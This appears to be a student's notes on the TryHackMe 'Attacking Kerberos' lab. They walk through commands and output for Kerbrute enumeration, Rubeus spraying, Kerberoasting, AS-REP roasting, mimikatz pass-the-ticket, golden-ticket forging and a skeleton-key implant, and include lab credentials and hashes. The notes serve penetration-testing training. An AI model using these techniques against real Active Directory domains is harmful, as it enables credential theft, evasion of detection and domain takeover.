#Windows #Kerberos

- https://tryhackme.com/room/attackingkerberos

What is Kerberos?: 

Kerberos is the default authentication service for Microsoft Windows domains. It is intended to be more "secure" than NTLM by using third party ticket authorization as well as stronger encryption. Even though NTLM has a lot more attack vectors to choose from Kerberos still has a handful of underlying vulnerabilities just like NTLM that we can use to our advantage

## Terminology

```
Ticket Granting Ticket (TGT) = authentication ticket used to request service tickets from TGS for specific resources from the domain

Authentication Service (AS) = issues TGT to be used by TGS in domain to request other machines & service tickets

Ticket Granting Service (TGS) = takes the TGT and returns a ticket to a machine on the domain

**Key Distribution Center (KDC)** = issues TGTs + tickets for AS + TGS

Service Principal Name (SPN) = an ID given to a service (required)

Privilege Attribute Certificate (PAC) = hold all user's info, sent to TGT + KDC

KDC Long Term Secret Key (KDC LTK) = key used to encrypt TGT and sign the PAC

Client Long Term Secret Key (CLTSK) = client key based on computer account, checks encrypted timestamp and encrypt session key

Service Long Term Secret Key (SLTSK) = service key based on service account, encrypts part of service ticket and signs the PAC

Session Key = issued by KDC when TGT is issued

```

- How Kerberos Works: https://www.youtube.com/watch?v=1yWW7VQUX0A
- Kerberos Explained: https://www.youtube.com/watch?v=5N242XcKAsM

messages include {Authenticators , Tickets }
User: message to KDC ----------> KDC ( Auth Server | TGT ) -----------------------> Service
User: TGT <---------------------- Auth Server to User
User: sends TGT ----------------> TGT: Service Ticket
User: gets  ST <------------------- ST
User: decrypts ST -----------------------------------------------------------------> ST
User: gets service <----------------------------------------------------------------- service

----
## tickets

the main TGT tickets are (base64 encoded):
- `.kirbi` for Rubeus 
- `.ccache` for Impacket
TGT is used at KDC to get service tickets

Attack Privilege Requirements
- Kerbrute enumeration (no domain access needed)
- Pass the Ticket (access as user to domain needed)
- Kerberoasting | AS-REP Roasting = access as any user
- Golden Ticket = full domain compromise (domain admin required)
- Silver ticket = server hash required
- Skeleton Key = full domain compromise (domain admin required)

## Kerbrute install

1.) Download a precompiled binary for your OS: https://github.com/ropnop/kerbrute/releases
2.) Rename `kerbrute_linux_amd64` to `kerbrute`
3.) `chmod +x kerbrute` - make `kerbrute` executable

## Kerbrute Enumeration

﻿Kerbrute is a popular enumeration tool used to brute-force and enumerate valid 
﻿active-directory users by abusing the Kerberos pre-authentication.
﻿- Attacktive Directory room: https://tryhackme.com/room/attacktivedirectory

```
sudo nano /etc/hosts

10.10.229.91 CONTROLLER.local
```

By brute-forcing Kerberos pre-authentication, you do not trigger the account failed to log on event which can throw up red flags to blue teams. When brute-forcing through Kerberos you can brute-force by only sending a single UDP frame to the KDC allowing you to enumerate the users on the domain from a wordlist.

download the Active Directory Wordlist
- https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/User.txt

Brute Forcing user accounts from a domain controller 
```
./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
```

## Rubeus: Brute force tickets

Rubeus has a wide variety of attacks and features that allow it to be a very versatile tool for attacking Kerberos. Just some of the many tools and attacks include overpass the hash, ticket requests and renewals, ticket management, ticket extraction, harvesting, pass the ticket, AS-REP Roasting, and Kerberoasting.

- https://github.com/GhostPack/Rubeus

Rubeus is on target machine
Start Machine > RDP
- `username:Administrator Password:P@$$W0rd Domain: controller.local`

**Harvesting tickets with Rubeus**

```Powershell
cd .\Downloads\
ls
Rubeus.exe harvest /interval:30      # harvests TGTs every 30 seconds
```

```
v1.5.0                                                                                                                                                            [*] Action: TGT Harvesting (with auto-renewal)                                   [*] Monitoring every 30 seconds for new TGTs                                     [*] Displaying the working TGT cache every 30 seconds

User       :  Administrator@CONTROLLER.LOCAL 
StartTime  :  1/12/2024 8:23:48 AM         
EndTime    :  1/12/2024 6:23:48 PM  
RenewTill  :  1/19/2024 8:23:48 AM 
Flags      :  name_canonicalize, pre_authent, initial, renewable, forwardable    Base64EncodedTicket   :                                                          

doIFjDCCBYigAwIBBaEDAgEWooIEgDCCBHxhggR4MIIEdKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQwMIIELKADAgESoQMCAQKiggQeBIIEGlAJBqiNHaZ73yoZXhKTYspVZSFdijVlzUag ....

```

**Brute forcing password-spraying**

Rubeus 
- brute force passwords = single user account + wordlist of passwords for attack
- sprays passwords = single password ("Password1") and _spray_ it against all found accounts in the domain. sprays password and gives a `.kirbi` TGT ticket to get a TGS ticket

to password spray you need:
- add domain controller domain name to windows host file
- add the IP and domain name 
```
controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>

echo 10.10.237.76 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
cd Downloads
Rubeus.exe brute /password:Password1 /noticket

```

```
[-] Blocked/Disabled user => Guest
[-] Blocked/Disables user => krbtgt
[+] STUPENDOUS => Machine1: Password1
[*] base64(Machine1.kirbi):

doIFWjCCBVagAwIBBaEDAgEWooIEUzCCBE9hggRLMIIER6ADAgEFoRIbEENPTlRST0xMRVIuTE
9DQUyiJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIubG9jYWyjggQDMIID/6ADAgESoQMCAQ
KiggPx ...

```

## kerberoasting attack

Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password.

- IF service has a registered SPN = roasting possible
- password strength, account privileges of cracked account
- use Bloodhound to find all roast-able accounts

```
cd \Downloads
Rubeus.exe kerberoast      # dumps Kerberos hash of any roastable users

[*] Action: Kerberoasting
[*] NOTICE: AES hashes will be returned for AES-enabled accounts. Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts
[*] Searching for current domain for kerberoastable users
[*] Total kerberoastable users: 2

[*] SamAccountName         : SQLService
[*] DistinguishedName      : CN=SQLService,CN=Users,DC=CONTROLLER,DC=local 
[*] ServicePrincipalName   : CONTROLLER-1/SQLService.CONTROLLER.local:30111     
[*] PwdLastSet             : 5/25/2020 10:28:26 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*SQLService$CONTROLLER.local$CONTROLLER
-1/SQLService.CONTROLLER.local:30111*$$247F6A95197971207A160692371F98BB$0F701D7A0
C04756576784DE76FC6EA4063896F ...

copy hash into a .txt file to be used with hashcat on attacker machine

hashcat -m 13100 -a0 hash.txt Pass.txt        # SQL Service

MYPassword123#

hashcat -m 13100 -a0 hash2.txt Pass.txt        # HTTP Service

Summer2020

```

- modified rockyou.txt wordlist: https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/master/Pass.txt

## AS-REP roasting

 AS-REP Roasting dumps the `krbasrep5` hashes of user accounts that have Kerberos pre-authentication disabled

Unlike Kerberoasting these users do not have to be service accounts the only requirement to be able to AS-REP roast a user is the user must have pre-authentication disabled.

During pre-authentication, the users hash will be used to encrypt a timestamp that the domain controller will attempt to decrypt to validate that the right hash is being used and is not replaying a previous request.

After validating the timestamp the KDC will then issue a TGT for the user.

If pre-authentication is disabled you can request any authentication data for any user and the KDC will return an encrypted TGT that can be cracked offline because the KDC skips the step of validating that the user is really who they say that they are.

**Dumping KRBASREP5 Hashes**

```
cd \Download
Rubeus.exe asreproast

[*] Action: AS-REP roasting 
[*] Target Domain          : CONTROLLER.local
[*] Searching path 'LDAP://CONTROLLER-1.CONTROLLER.local/DC=CONTROLLER,DC=local'
 for AS-REP roastable users
[*] SamAccountName         : Admin2 
[*] DistinguishedName      : CN=Admin-2,CN=Users,DC=CONTROLLER,DC=local 
[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::9516:f7:acfb:3
666%5)
[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\Admin2'
[+] AS-REQ w/o preauth successful! 
[*] AS-REP hash:

save hash in hash3.txt 
insert 23$  after $krb5asrep$

hashcat -m 18200 hash3.txt Pass.txt

User3 : Password3

Administrator : P@$$W0rd

```

## Pass the ticket : mimikatz

Mimikatz is a very popular and powerful post-exploitation tool most commonly used for dumping user credentials inside of an active directory network however we'll be using mimikatz in order to dump a TGT from LSASS memory

- This will only be an overview of how the pass the ticket attacks work as THM does not currently support networks but I challenge you to configure this on your own network.
- You can run this attack on the given machine however you will be escalating from a domain admin to a domain admin because of the way the domain controller is set up.

Pass the ticket works by dumping the TGT from the LSASS memory of the machine

- The Local Security Authority Subsystem Service (LSASS) is a memory process that stores credentials on an active directory server and can store Kerberos ticket along with other credential types to act as the gatekeeper and accept or reject the credentials provided
- You can dump the Kerberos Tickets from the LSASS memory just like you can dump hashes. When you dump the tickets with mimikatz it will give us a `.kirbi `ticket which can be used to gain domain admin if a domain admin ticket is in the LSASS memory.
- This attack is great for privilege escalation and lateral movement if there are unsecured domain service account tickets laying around

The attack allows you to escalate to domain admin if you dump a domain admin's ticket and then impersonate that ticket using mimikatz PTT attack allowing you to act as that domain admin.
- The attack allows you to escalate to domain admin if you dump a domain admin's ticket and then impersonate that ticket using mimikatz PTT attack allowing you to act as that domain admin.

```
cd \Downloads
mimikatz.exe
privilege::debug      # output 20 = admin priv , all good

sekurlsa::tickets /export    # exports all .kirbi tickets

exit, look for administrator tickets

kerberos::ptt <ticket>

kerberos::ptt [0;182a4b]-1-0-40a50000-CONTROLLER-1$@GC-
CONTROLLER-1.CONTROLLER.local.kirbi             # type the whole thing

```

## Golden/Silver ticket attacks

Mimikatz is a very popular and powerful post-exploitation tool most commonly used for dumping user credentials inside of an active directory network however well be using mimikatz in order to create a silver ticket.

A silver ticket can sometimes be better used in engagements rather than a golden ticket because it is a little more discreet.
-  stealth = silver ticket, limited to the service targeted
- silver = domain's SQL server, kerberoast that service , dump the service hash, impersonate the TGT to get TGS ticket for SQL => SQL service access

A KRBTGT is the service account for the KDC this is the Key Distribution Center that issues all of the tickets to the clients.
- if you impersonate this account and make a golden ticket, you can make any service ticket

Golden/Silver ticket attack

A golden ticket attack works by dumping the ticket-granting ticket of any user on the domain admin
- for gold dump the `krbtgt` ticket 
- for silver dump any service or domain admin ticket

dump the `krbtgt`
```
cd \Downloads
mimikatz.exe
privilege::debug
lsadump::lsa /inject/name:krbtgt     # dumps the hash

NTLM : 72cd714611b64cd4d5550cd2759db3f6           # paste /krbtgt: <here>
aes128_hmac (4096) : 88cc87377b02a885b84fe7050f336d9b

kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:1103

User      : Administrator 
Domain    : controller.local
ServiceKey: 72cd714611b64cd4d5550cd2759db3f6 - rc4_hmac_nt
Lifetime  : 1/12/2024 11:49:45 AM ; 1/9/2034 11:49:45 AM ; 1/9/2034 11:49:45 AM 
-> Ticket : ticket.kirbi

 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !

misc::cmd    # elevates command prompt with given ticket 

access machines you want based on user privileges

-----
lsadump::dcsync /domain:controller.local /all /csv

What is the SQLService NTLM Hash?

cd40c9ed96265531b21fc5b1dafcfb0a

  
What is the Administrator NTLM Hash?

2777b7fec870e04dda00cd7260f7bee6

```

## skeleton key: mimikatz

The skeleton key works by abusing the AS-REQ encrypted timestamps as I said above, the timestamp is encrypted with the users NT hash. The domain controller then tries to decrypt this timestamp with the users NT hash, once a skeleton key is implanted the domain controller tries to decrypt the timestamp using both the user NT hash and the skeleton key NT hash allowing you access to the domain forest.

```
cd \Downloads
mimikatz.exe
privilege::debug
misc::skeleton

```

The default credentials will be: "_mimikatz_"  

example: `net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz` - The share will now be accessible without the need for the Administrators password

example: `dir \\Desktop-1\c$ /user:Machine1 mimikatz` - access the directory of Desktop-1 without ever knowing what users have access to Desktop-1

The skeleton key will not persist by itself because it runs in the memory, it can be scripted or persisted using other tools and techniques however that is out of scope for this room.

